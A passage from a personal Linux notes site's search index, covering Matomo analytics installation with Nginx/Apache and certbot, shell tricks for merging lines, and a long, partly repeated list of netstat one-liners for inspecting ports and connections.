manager."},{"location":"linux/matomo/#save-and-close-the-file-test-nginx-configuration-then-reload-nginx-for-the-changes-to-take-effect","text":"nginx -t","title":"Save and close the file. Test Nginx configuration, then reload Nginx for the changes to take effect."},{"location":"linux/matomo/#install-php-modules-required-or-recommended-by-matomo","text":"apt install php-imagick php7.4-mysql php7.4-fpm php7.4-common php7.4-gd php7.4-json php7.4-curl php7.4-zip php7.4-xml php7.4-mbstring php7.4-bz2 php7.4-intl","title":"Install PHP modules required or recommended by Matomo."},{"location":"linux/matomo/#if-you-are-using-apache-web-server-you-need-to-reload-it-to-make-it-run-with-these-php-modules","text":"systemctl reload apache2 Nginx users don\u2019t need to reload. Now you should be able to visit the Matomo web-based install wizard at http://w.nr1.nu , but before entering any information, let\u2019s enable HTTPS.","title":"If you are using Apache web server, you need to reload it to make it run with these PHP modules."},{"location":"linux/matomo/#enable-https","text":"To encrypt the HTTP traffic when you visit the Matomo web interface, we can enable HTTPS by installing a free TLS certificate issued from Let\u2019s Encrypt. Run the following commands to install Let\u2019s Encrypt client (certbot) on Ubuntu 20.04. apt update apt install certbot","title":"Enable HTTPS"},{"location":"linux/matomo/#if-you-use-nginx-you-also-need-to-install-the-certbot-nginx-plugin","text":"apt install python3-certbot-nginx","title":"If you use Nginx, you also need to install the Certbot Nginx plugin."},{"location":"linux/matomo/#then-run-the-following-command-to-obtain-and-install-tls-certificate","text":"certbot --nginx --agree-tos --redirect --hsts --staple-ocsp --email wuseman@nr1.nu -d w.nr1.nu","title":"Then run the following command to obtain and install TLS certificate."},{"location":"linux/matomo/#if-you-use-apache-you-also-need-to-install-the-certbot-apache-plugin","text":"emerge app-crypt/certbot-apache apt install python3-certbot-apache","title":"If you use Apache, you also need to install the Certbot Apache plugin."},{"location":"linux/matomo/#then-run-this-command-to-obtain-and-install-tls-certificate","text":"certbot --apache --agree-tos --redirect --hsts --staple-ocsp --email you@example.com -d w.nr1.nu","title":"Then run this command to obtain and install TLS certificate."},{"location":"linux/matomo/#step-6-finish-the-installation-in-your-web-browser","text":"[ visit http://localhost/matomo/ ]( https://w.nr1.nu )","title":"Step 6: Finish the Installation in your Web Browser"},{"location":"linux/matomo/#permissions-problem","text":"chown -R wuseman:wuseman /var/www/html/ find /var/www/html/ -type f -exec chmod 644 {} \\; find /var/www/html/ -type d -exec chmod 755 {} \\; find /var/www/html/assets/ -type f -exec chmod 644 {} \\; find /var/www/html/assets/ -type d -exec chmod 755 {} \\; find /var/www/html/cache/ -type f -exec chmod 644 {} \\; find /var/www/html/cache/ -type d -exec chmod 755 {} \\; find /var/www/html/logs/ -type f -exec chmod 644 {} \\; find /var/www/html/logs/ -type d -exec chmod 755 {} \\; find /var/www/html/tcpdf/ -type f -exec chmod 644 {} \\; find /var/www/html/tcpdf/ -type d -exec chmod 755 {} \\; find /var/www/html/templates_c -type f -exec chmod 644 {} \\; find /var/www/html/templates_c -type d -exec chmod 755 {} \\;","title":"Permissions problem"},{"location":"linux/matomo/#install-by-copy-and-paste","text":"mysql -e \"drop datababse matomo\" mysql -e \"create database matomo;\" mysql -e \"create user wuseman@localhost identified by 'odemnn';\" mysql -e \"grant all privileges on matomo.* to wuseman@localhost;\" mysql -e \"flush privileges;\" wget https://builds.matomo.org/matomo-latest.zip unzip matomo-latest.zip -d /var/www/html/site chown wuseman:wuseman /var/www/html/site -R google-chrome-stable http://localhost/matomo","title":"Install By Copy And Paste"},{"location":"linux/matomo/#add-below-js-script-inside-header-on-your-website-edit-the-setsiteid-if-needed","text":"<!-- Matomo --> < script > var _paq = window . _paq = window . _paq || []; /* tracker methods like \"setCustomDimension\" should be called before \"trackPageView\" */ _paq . push ([ 'trackPageView' ]); _paq . push ([ 'enableLinkTracking' ]); ( function () { var u = \"//w.nr1.nu/\" ; _paq . push ([ 'setTrackerUrl' , u + 'matomo.php' ]); _paq . push ([ 'setSiteId' , '1' ]); var d = document , g = d . createElement ( 'script' ), s = d . getElementsByTagName ( 'script' )[ 0 ]; g . async = true ; g . src = u + 'matomo.js' ; s . parentNode . insertBefore ( g , s ); })(); < /script> <!-- End Matomo Code -->","title":"Add below JS script inside header on your website, edit the setSiteId if needed"},{"location":"linux/matomo/#end","text":"","title":"End!"},{"location":"linux/merge-tricks/","text":"merge tricks Various tricks for merge two lines to one-side-by-side Xargs xargs -n2 -d '\\n' paste paste -s -d ',\\n' infile paste -d \" \" - - < filename awk awk 'NR%2{printf \"%s \",$0;next;}1' yourFile awk '{key=$0; getline; print key \", \" $0;}' awk 'ORS=NR%2?FS:RS' file awk 'ORS=NR%2?FS:RS' file ``` sh awk '{ ORS = (NR%2 ? FS : RS) } 1' file awk '{ ORS = (NR%2 ? \",\" : RS) } 1' file awk '{ if (NR%2 != 0) line=$0; else {printf(\"%s %s\\n\", line, $0); line=\"\";} } END {if (length(line)) print line;}' sed sed 'N;s/\\n/ /' yourFile while while read line1 ; do read line2 ; echo \" $line1 , $line2 \" ; done < data.txt ex ex -c \"%g/KEY/j\" -c \"wq\" data.txt perl perl -0pe 's/(.*)\\n(.*)\\n/$1 $2\\n/g'","title":"merge tricks"},{"location":"linux/merge-tricks/#merge-tricks","text":"Various tricks for merge two lines to one-side-by-side","title":"merge tricks"},{"location":"linux/merge-tricks/#xargs","text":"xargs -n2 -d '\\n'","title":"Xargs"},{"location":"linux/merge-tricks/#paste","text":"paste -s -d ',\\n' infile paste -d \" \" - - < filename","title":"paste"},{"location":"linux/merge-tricks/#awk","text":"awk 'NR%2{printf \"%s \",$0;next;}1' yourFile awk '{key=$0; getline; print key \", \" $0;}' awk 'ORS=NR%2?FS:RS' file awk 'ORS=NR%2?FS:RS' file ``` sh awk '{ ORS = (NR%2 ? FS : RS) } 1' file awk '{ ORS = (NR%2 ? \",\" : RS) } 1' file awk '{ if (NR%2 != 0) line=$0; else {printf(\"%s %s\\n\", line, $0); line=\"\";} } END {if (length(line)) print line;}'","title":"awk"},{"location":"linux/merge-tricks/#sed","text":"sed 'N;s/\\n/ /' yourFile","title":"sed"},{"location":"linux/merge-tricks/#while","text":"while read line1 ; do read line2 ; echo \" $line1 , $line2 \" ; done < data.txt","title":"while"},{"location":"linux/merge-tricks/#ex","text":"ex -c \"%g/KEY/j\" -c \"wq\" data.txt","title":"ex"},{"location":"linux/merge-tricks/#perl","text":"perl -0pe 's/(.*)\\n(.*)\\n/$1 $2\\n/g'","title":"perl"},{"location":"linux/netstat/","text":"netstat Find all IP connected to my host through TCP connection and count it netstat -an | grep \":80\" | awk '{print $5}' | sed s/::ffff://g | cut -d: -f1 | sort | uniq -c | sort -n | tail -1000 | grep -v \"0.0.0.0\" Equivalent to ifconfig -a in HPUX netstat -nr | egrep -v \"Routing|Interface|lo0\" | awk '{print $5}' | sort -u | while read l ; do ifconfig $l ; echo \" Station Addr: `lanscan -ia|grep \" $l \"|cut -d ' ' -f 1`\" ; done Quick network status of machine netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn Open Port Check netstat -an | grep color -i -E 'listen|listening' See KeepAlive counters on tcp connections netstat -town Show number of connections per remote IP netstat -antu | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n Find default gateway netstat -rn | awk '/UG/{print $2}' Show apps that use internet connection at the moment. netstat -lantp | grep -i establ | awk -F/ '{print $2}' | uniq | sort All IP connected to my host netstat -nut | awk '$NF==\"ESTABLISHED\" {print $5}' | cut -d: -f1 | sort -u display only tcp netstat -4tnape check open ports (both ipv4 and ipv6) netstat -plnt show open ports on computer netstat -an | grep -i listen Sorted list of established destination connections netstat | grep EST | awk '{print $5}' | sort Get number of established sessions on a given port netstat -anp | grep :80 | grep ESTABLISHED | wc -l Get connections from a SSH tunnel netstat -t -p extend | grep USERNAME Check if TCP port 25 is open netstat -lntp Lists all listening ports together with the PID of the associated process netstat -tunlp list current ssh clients netstat -atn | grep :22 | grep ESTABLISHED | awk '{print $4}' | sed 's/:22//' Checking total connections to each Ip inserver netstat -alpn | grep :80 | awk '{print $4}' | awk -F: '{print $(NF-1)}' | sort | Show the number of current httpd processes netstat -l -p tcp | egrep -e 'www.*[0-9]{3,4}\\/(apache2|httpd)' | awk '{print$7}' Network Interfaces netstat -ie ```sh netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n Prints tcp and udp connections netstat -nlput see the TIME_WAIT and ESTABLISHED nums of the network netstat -n | awk '/^tcp/ {++B[$NF]} END {for(a in B) print a, B[a]}' See a list of ports running netstat -an | grep -i listen Informations sur les connexions reseau netstat -taupe ```sh netstat -luntp ```sh netstat -luntp \u0639\u0631\u0636 \u0627\u062a\u0635\u0627\u0644\u0627\u062a \u0644\u0628\u0648\u0631\u062a \u0645\u062d\u062f\u062f netstat -antp | grep 22 Display connections histogram netstat -an | grep ESTABLISHED | awk '\\''{print $5}' \\' ' | awk -F: ' \\' '{print $1}' \\' ' | sort | uniq -c | awk ' \\' '{ printf(\"%s\\t%s\\t\",$2,$1); for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\"}' \\' ' Show apps that use internet connection at the moment. (Multi-Language) netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq Show all programs on UDP and TCP ports with timer information netstat -putona Examine processes generating traffic on your website netstat -np | grep -v ^unix List programs with open ports and connections netstat -ntauple List the number and type of active network connections netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c Show complete URL in ```sh netstat output ```sh netstat -tup -W | column -t List Listen Port by numbers netstat -tlpn | sort -t: -k2 -n ```sh netstat with group by ip adress ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n Show apps that use internet connection at the moment. netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq find an unused unprivileged TCP port netstat -atn | awk ' /tcp/ {printf(\"%s\\n\",substr($4,index($4,\":\")+1,length($4) )) }' | sed -e \"s/://g\" | sort -rnu | awk '{array [$1] = $1} END {i=32768; again=1; while (again == 1) {if (array[i] == i) {i=i+1} else {print i; again=0}}}' Show in a web server, running in the port 80, how many ESTABLISHED connections by ip it has. netstat -ant | grep :80 | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n Sorted list of established destination connections netstat | awk '/EST/{print $5}' | sort Two command output netstat -n | grep ESTAB | grep :80 | tee /dev/stderr | wc -l calulate established tcp connection of local machine netstat -an | grep -ci \"tcp.*established\" Most simple way to get a list of open ports netstat -lnp calulate established tcp connection of local machine netstat -an | awk '$1 ~ /[Tt][Cc][Pp]/ && $NF ~ /ESTABLISHED/{i++}END{print \"Connected:\\t\", i}' List all TCP opened ports on localhost in LISTEN mode netstat -nptl List top 20 IP from which TCP connection is in SYN_RECV state netstat -pant 2 > /dev/null | grep SYN_ | awk '{print $5;}' | cut -d: -f1 | sort | uniq -c | sort -n | tail -20 Who has the most Apache connections. netstat -anl | grep :80 | awk '{print $5}' | cut -d \":\" -f 1 | uniq -c | sort -n | grep -c IPHERE Netstat Connection Check netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n | tail Show complete URL in ```sh netstat output ```sh netstat -pnut -W | column -t -s $'\\t' Show what PID is listening on port 80 on Linux netstat -alnp | grep ::80 All IP connected to my host netstat -lantp | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort -u get a process list by listen port netstat -ntlp | grep -w 80 | awk '{print $7}' | cut -d/ -f1 IP addresses connected to port 80 netstat -tn 2 >/dev/null | grep ':80 ' | awk '{print $5}' | sed -e 's/::ffff://' | cut -f1 -d: | sort | uniq -c | sort -rn | head TCP and UDP listening sockets netstat -t -u -l The program listening on port 8080 through IPv6 netstat -lnp6 | grep :8080 | sed 's#^[^\\/]*/\\([a-z0-9]*\\)#\\1#' list ips with high number of connections netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head Show all LISTENing and open server connections, with port number and process name/pid netstat -tulpn Show which programs are listening on TCP and UDP ports netstat -plunt Show all listening and established ports TCP and UDP together with the PID of the associated process netstat -plantu list current ssh clients netstat -tn | awk '($4 ~ /:22\\s*/) && ($6 ~ /^EST/) {print substr($5, 0, index($5,\":\"))}' tell if a port is in use netstat -a numeric-ports | grep 8321 Lists all listening ports together with the PID of the associated process netstat -anpe Number of open connections per ip. netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n find an unused unprivileged TCP port netstat -atn | perl -0777 -ne '@ports = /tcp.*?\\:(\\d+)\\s+/imsg ; for $port (32768..61000) {if(!grep(/^$port$/, @ports)) { print $port; last } }' Find default gateway netstat -rn | grep UG | tr -s \" \" | cut -d \" \" -f2 Fetch the Gateway Ip Address netstat -nr | awk 'BEGIN {while ($3!=\"0.0.0.0\") getline; print $2}' ```sh netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^(::ffff:|[0-9|])/ { gsub(\"::ffff:\",\"\",$5); print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr check open ports (both ipv4 and ipv6) netstat -plntu To find which host made maximum number of specific tcp connections netstat -n | grep '^tcp.*<IP>:<PORT>' | tr \" \" | awk 'BEGIN{FS=\"( |:)\"}{print $6}' | sort | uniq -c | sort -n -k1 | awk '{if ($1 >= 10){print $2}}' Count TCP States From Netstat netstat -an | awk '/tcp/ {print $6}' | sort | uniq -c To find the LDAP clients connected to LDAP service running on Solaris netstat -n -f inet | awk '/\\.389/{print $2}' | cut -f1-4 -d. | sort -u Summarize the number of open TCP connections by state netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r calulate established tcp connection of local machine netstat -an | grep -Ec '^tcp.+ESTABLISHED$' count IPv4 connections per IP netstat -anp | grep 'tcp\\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1 | sort | uniq -c | sort -n TCP and UDP listening sockets netstat -tunlapo Active Internet connections (only servers) netstat -lnptu open listening ports netstat -ltn | awk -n '/tcp /{ split($4, x, \":\"); print(x[2]); }' | sort -n List state of NAT. netstat-nat -n Check for listening services netstat -tuapen | grep LISTEN ```sh netstat with group by (ip adress) ```sh netstat -nt | awk -F\":\" '{print $2}' | sort | uniq -c Graph # of connections for each hosts. netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }' Graph # of connections for each hosts. netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }' Find out if MySQL is up and listening on Linux netstat -tap | grep mysql get the IP connected to the server (usefull to detect IP that should be blocked) netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n NETSTAT ESTABLISHED netstat | find \"ESTABLISHED\" monitor all open connections to specific port netstat -anp | grep \":<port>\" Check if TCP port 25 is open netstat -tln | grep :25 Command results as an image capture netstat -rn | convert label:@- netstat.png List open TCP/UDP ports netstat -anp tcp udp | grep LISTEN Show number of connections per remote IP netstat -antu | awk '$5 ~ /[0-9]:/{split($5, a, \":\"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | \"sort -k1 -nr\"}' List open TCP/UDP ports netstat -ltun Netstat List out Remote IP's Connected to Server Only netstat -tn | awk '{print $5}' | egrep -v '(localhost|\\*\\:\\*|Address|and|servers|fff|127\\.0\\.0)' | sed 's/:[0-99999999].*//g' find out which TCP ports are listening and opened by which process in verbose netstat -tlvp find an unused unprivileged TCP port netstat -tan | awk '$1 == \"tcp\" && $4 ~ /:/ { port=$4; sub(/^[^:]+:/, \"\", port); used[int(port)] = 1; } END { for (p = 32768; p <= 61000; ++p) if (! (p in used)) { print p; exit(0); }; exit(1); }' showing opened ports on machine netstat -tulpnc find an unused unprivileged TCP port netstat -atn | perl -ane 'if ( $F[3] =~ /(\\d+)$/ ) { $x{$1}=1 } END{ print( (grep {!$x{$_}} 32768..61000)[0] . \"\\n\" )}' Lists open ports netstat -antuwp | egrep \"(^[^t])|(^tcp.*LISTEN)\" Number of connections per IP with range 24 netstat -tn | grep :80 | awk '{print $5}' | grep -v ':80' | cut -f1 -d: | cut -f1,2,3 -d. | sort | uniq -c | sort -n Check the connection of the maximum number of IP netstat -na | grep ESTABLISHED | awk '{print$5}' | awk -F : '{print$1}' | sort | uniq -c | sort -r Detect Connections On Port - Android netstat -lptu | grep -E \"22.*ESTABLISHED\" | cut -s -d ':' -f2 | awk '{print $2}' How to Kill Process that is Running on Certain Port in Windows? netstat -a -o -n | grep 8080 List all IP's connected to port 80 netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head See who are using a specific port netstat -Aan | grep .80 | grep -v 127 .0.0.1 | grep EST | awk '{print $6}' | cut -d \".\" -f1,2,3,4 | sort | uniq Equivalent to ifconfig -a in HPUX netstat -in Print whois info about connected ip addresses netstat -np inet | awk '/firefox/{split($5,a,\":\");z[a[1]]++} END{for(i in z){system(\"whois \" i)}}' | less All IP connected to my host netstat -nut | sed '/ESTABLISHED/!d;s/.*[\\t ]\\+\\(.*\\):.*/\\1/' | sort -u Number of open connections per ip. netstat -an | grep 80 | wc -l Quick network status of machine netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn See KeepAlive counters on tcp connections netstat -town check open ports (both ipv4 and ipv6) netstat -plnt see the TIME_WAIT and ESTABLISHED nums of the network netstat -n | awk '/^tcp/ {++B[$NF]} END {for(a in B) print a, B[a]}' Display connections histogram netstat -an | grep ESTABLISHED | awk '\\''{print $5}' \\' ' | awk -F: ' \\' '{print $1}' \\' ' | sort | uniq -c | awk ' \\' '{ printf(\"%s\\t%s\\t\",$2,$1); for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\"}' \\' ' Show apps that use internet connection at the moment. (Multi-Language) netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq Show all programs on UDP and TCP ports with timer information netstat -putona Examine processes generating traffic on your website netstat -np | grep -v ^unix List programs with open ports and connections netstat -ntauple List the number and type of active network connections netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c Show complete URL in ```sh netstat output ```sh netstat -tup -W | column -t List Listen Port by numbers netstat -tlpn | sort -t: -k2 -n ```sh netstat with group by ip adress ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n Show apps that use internet connection at the moment. netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq find an unused unprivileged TCP port netstat -atn | awk ' /tcp/ {printf(\"%s\\n\",substr($4,index($4,\":\")+1,length($4) )) }' | sed -e \"s/://g\" | sort -rnu | awk '{array [$1] = $1} END {i=32768; again=1; while (again == 1) {if (array[i] == i) {i=i+1} else {print i; again=0}}}' Show in a web server, running in the port 80, how many ESTABLISHED connections by ip it has. netstat -ant | grep :80 | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n Sorted list of established destination connections netstat | awk '/EST/{print $5}' | sort Two command output netstat -n | grep ESTAB | grep :80 | tee /dev/stderr | wc -l calulate established tcp connection of local machine netstat -an | grep -ci \"tcp.*established\" Most simple way to get a list of open ports netstat -lnp calulate established tcp connection of local machine netstat -an | awk '$1 ~ /[Tt][Cc][Pp]/ && $NF ~ /ESTABLISHED/{i++}END{print \"Connected:\\t\", i}' List all TCP opened ports on localhost in LISTEN mode netstat -nptl List top 20 IP from which TCP connection is in SYN_RECV state netstat -pant 2 > /dev/null | grep SYN_ | awk '{print $5;}' | cut -d: -f1 | sort | uniq -c | sort -n | tail -20 Who has the most Apache connections. netstat -anl | grep :80 | awk '{print $5}' | cut -d \":\" -f 1 | uniq -c | sort -n | grep -c IPHERE Netstat Connection Check netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n | tail Show complete URL in ```sh netstat output ```sh netstat -pnut -W | column -t -s $'\\t' Show what PID is listening on port 80 on Linux netstat -alnp | grep ::80 All IP connected to my host netstat -lantp | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort -u get a process list by listen port netstat -ntlp | grep -w 80 | awk '{print $7}' | cut -d/ -f1 IP addresses connected to port 80 netstat -tn 2 >/dev/null | grep ':80 ' | awk '{print $5}' | sed -e 's/::ffff://' | cut -f1 -d: | sort | uniq -c | sort -rn | head TCP and UDP listening sockets netstat -t -u -l The program listening on port 8080 through IPv6 netstat -lnp6 | grep :8080 | sed 's#^[^\\/]*/\\([a-z0-9]*\\)#\\1#' list ips with high number of connections netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head Show all LISTENing and open server connections, with port number and process name/pid netstat -tulpn Show which programs are listening on TCP and UDP ports netstat -plunt Show all listening and established ports TCP and UDP together with the PID of the associated process netstat -plantu list current ssh clients netstat -tn | awk '($4 ~ /:22\\s*/) && ($6 ~ /^EST/) {print substr($5, 0, index($5,\":\"))}' tell if a port is in use netstat -a numeric-ports | grep 8321 Lists all listening ports together with the PID of the associated process netstat -anpe Number of open connections per ip. netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n find an unused unprivileged TCP port netstat -atn | perl -0777 -ne '@ports = /tcp.*?\\:(\\d+)\\s+/imsg ; for $port (32768..61000) {if(!grep(/^$port$/, @ports)) { print $port; last } }' Find default gateway netstat -rn | grep UG | tr -s \" \" | cut -d \" \" -f2 Fetch the Gateway Ip Address netstat -nr | awk 'BEGIN {while ($3!=\"0.0.0.0\") getline; print $2}' ```sh netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^(::ffff:|[0-9|])/ { gsub(\"::ffff:\",\"\",$5); print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr check open ports (both ipv4 and ipv6) netstat -plntu To find which host made maximum number of specific tcp connections netstat -n | grep '^tcp.*<IP>:<PORT>' | tr \" \" | awk 'BEGIN{FS=\"( |:)\"}{print $6}' | sort | uniq -c | sort -n -k1 | awk '{if ($1 >= 10){print $2}}' Count TCP States From Netstat netstat -an | awk '/tcp/ {print $6}' | sort | uniq -c To find the LDAP clients connected to LDAP service running on Solaris netstat -n -f inet | awk '/\\.389/{print $2}' | cut -f1-4 -d. | sort -u Summarize the number of open TCP connections by state netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r calulate established tcp connection of local machine netstat -an | grep -Ec '^tcp.+ESTABLISHED$' count IPv4 connections per IP netstat -anp | grep 'tcp\\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1 | sort | uniq -c | sort -n TCP and UDP listening sockets netstat -tunlapo Active Internet connections (only servers) netstat -lnptu open listening ports netstat -ltn | awk -n '/tcp /{ split($4, x, \":\"); print(x[2]); }' | sort -n List state of NAT. netstat-nat -n Check for listening services netstat -tuapen | grep LISTEN ```sh netstat with group by (ip adress) ```sh netstat -nt | awk -F\":\" '{print $2}' | sort | uniq -c Graph # of connections for each hosts. netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }' Find out if MySQL is up and listening on Linux netstat -tap | grep mysql get the IP connected to the server (usefull to detect IP that should be blocked) netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n NETSTAT ESTABLISHED netstat | find \"ESTABLISHED\" monitor all open connections to specific port netstat -anp | grep \":<port>\" Check if TCP port 25 is open netstat -tln | grep :25 Command results as an image capture netstat -rn | convert label:@- netstat.png List open TCP/UDP ports netstat -anp tcp udp | grep LISTEN Show number of connections per remote IP netstat -antu | awk '$5 ~ /[0-9]:/{split($5, a, \":\"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | \"sort -k1 -nr\"}' List open TCP/UDP ports netstat -ltun Netstat List out Remote IP's Connected to Server Only netstat -tn | awk '{print $5}' | egrep -v '(localhost|\\*\\:\\*|Address|and|servers|fff|127\\.0\\.0)' | sed 's/:[0-99999999].*//g' find out which TCP ports are listening and opened by which process in verbose netstat -tlvp find an unused unprivileged TCP port netstat -tan | awk '$1 == \"tcp\" && $4 ~ /:/ { port=$4; sub(/^[^:]+:/, \"\", port); used[int(port)] = 1; } END { for (p = 32768; p <= 61000; ++p) if (! (p in used)) { print p; exit(0); }; exit(1); }' showing opened ports on machine netstat -tulpnc find an unused unprivileged TCP port netstat -atn | perl -ane 'if ( $F[3] =~ /(\\d+)$/ ) { $x{$1}=1 } END{ print( (grep {!$x{$_}} 32768..61000)[0] . \"\\n\" )}' Lists open ports netstat -antuwp | egrep \"(^[^t])|(^tcp.*LISTEN)\" Number of connections per IP with range 24 netstat -tn | grep :80 | awk '{print $5}' | grep -v ':80' | cut -f1 -d: | cut -f1,2,3 -d. | sort | uniq -c | sort -n Check the connection of the maximum number of IP netstat -na | grep ESTABLISHED | awk '{print$5}' | awk -F : '{print$1}' | sort | uniq -c | sort -r","title":"netstat"},{"location":"linux/netstat/#netstat","text":"","title":"netstat"},{"location":"linux/netstat/#find-all-ip-connected-to-my-host-through-tcp-connection-and-count-it","text":"netstat -an | grep \":80\" | awk '{print $5}' | sed s/::ffff://g | cut -d: -f1 | sort | uniq -c | sort -n | tail -1000 | grep -v \"0.0.0.0\"","title":"Find all IP connected to my host through TCP connection and count it"},{"location":"linux/netstat/#equivalent-to-ifconfig--a-in-hpux","text":"netstat -nr | egrep -v \"Routing|Interface|lo0\" | awk '{print $5}' | sort -u | while read l ; do ifconfig $l ; echo \" Station Addr: `lanscan -ia|grep \" $l \"|cut -d ' ' -f 1`\" ; done","title":"Equivalent to ifconfig -a in HPUX"},{"location":"linux/netstat/#quick-network-status-of-machine","text":"netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn","title":"Quick network status of machine"},{"location":"linux/netstat/#open-port-check","text":"netstat -an | grep color -i -E 'listen|listening'","title":"Open Port Check"},{"location":"linux/netstat/#see-keepalive-counters-on-tcp-connections","text":"netstat -town","title":"See KeepAlive counters on tcp connections"},{"location":"linux/netstat/#show-number-of-connections-per-remote-ip","text":"netstat -antu | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n","title":"Show number of connections per remote IP"},{"location":"linux/netstat/#find-default-gateway","text":"netstat -rn | awk '/UG/{print $2}'","title":"Find default gateway"},{"location":"linux/netstat/#show-apps-that-use-internet-connection-at-the-moment","text":"netstat -lantp | grep -i establ | awk -F/ '{print $2}' | uniq | sort","title":"Show apps that use internet connection at the moment."},{"location":"linux/netstat/#all-ip-connected-to--my-host","text":"netstat -nut | awk '$NF==\"ESTABLISHED\" {print $5}' | cut -d: -f1 | sort -u","title":"All IP connected to  my host"},{"location":"linux/netstat/#display-only-tcp","text":"netstat -4tnape","title":"display only tcp"},{"location":"linux/netstat/#check-open-ports-both-ipv4-and-ipv6","text":"netstat -plnt","title":"check open ports (both ipv4 and ipv6)"},{"location":"linux/netstat/#show-open-ports-on-computer","text":"netstat -an | grep -i listen","title":"show open ports on computer"},{"location":"linux/netstat/#sorted-list-of-established-destination-connections","text":"netstat | grep EST | awk '{print $5}' | sort","title":"Sorted list of established destination connections"},{"location":"linux/netstat/#get-number-of-established-sessions-on-a-given-port","text":"netstat -anp | grep :80 | grep ESTABLISHED | wc -l","title":"Get number of established sessions on a given port"},{"location":"linux/netstat/#get-connections-from-a-ssh-tunnel","text":"netstat -t -p extend | grep USERNAME","title":"Get connections from a SSH tunnel"},{"location":"linux/netstat/#check-if-tcp-port-25-is-open","text":"netstat -lntp","title":"Check if TCP port 25 is open"},{"location":"linux/netstat/#lists-all-listening-ports-together-with-the-pid-of-the-associated-process","text":"netstat -tunlp","title":"Lists all listening ports together with the PID of the associated process"},{"location":"linux/netstat/#list-current-ssh-clients","text":"netstat -atn | grep :22 | grep ESTABLISHED | awk '{print $4}' | sed 's/:22//'","title":"list current ssh clients"},{"location":"linux/netstat/#checking-total-connections-to-each-ip-inserver","text":"netstat -alpn | grep :80 | awk '{print $4}' | awk -F: '{print $(NF-1)}' | sort |","title":"Checking total connections to each Ip inserver"},{"location":"linux/netstat/#show-the-number-of-current-httpd-processes","text":"netstat -l -p tcp | egrep -e 'www.*[0-9]{3,4}\\/(apache2|httpd)' | awk '{print$7}'","title":"Show the number of current httpd processes"},{"location":"linux/netstat/#network-interfaces","text":"netstat -ie","title":"Network Interfaces"},{"location":"linux/netstat/#sh","text":"netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"```sh"},{"location":"linux/netstat/#prints-tcp-and-udp-connections","text":"netstat -nlput","title":"Prints tcp and udp connections"},{"location":"linux/netstat/#see-the-time_wait-and-established-nums-of-the-network","text":"netstat -n | awk '/^tcp/ {++B[$NF]} END {for(a in B) print a, B[a]}'","title":"see the TIME_WAIT and ESTABLISHED nums of the network"},{"location":"linux/netstat/#see-a-list-of-ports-running","text":"netstat -an | grep -i listen","title":"See a list of ports running"},{"location":"linux/netstat/#informations-sur-les-connexions-reseau","text":"netstat -taupe","title":"Informations sur les connexions reseau"},{"location":"linux/netstat/#sh_1","text":"netstat -luntp ```sh netstat -luntp","title":"```sh"},{"location":"linux/netstat/#_1","text":"netstat -antp | grep 22","title":"&#1593;&#1585;&#1590; &#1575;&#1578;&#1589;&#1575;&#1604;&#1575;&#1578; &#1604;&#1576;&#1608;&#1585;&#1578; 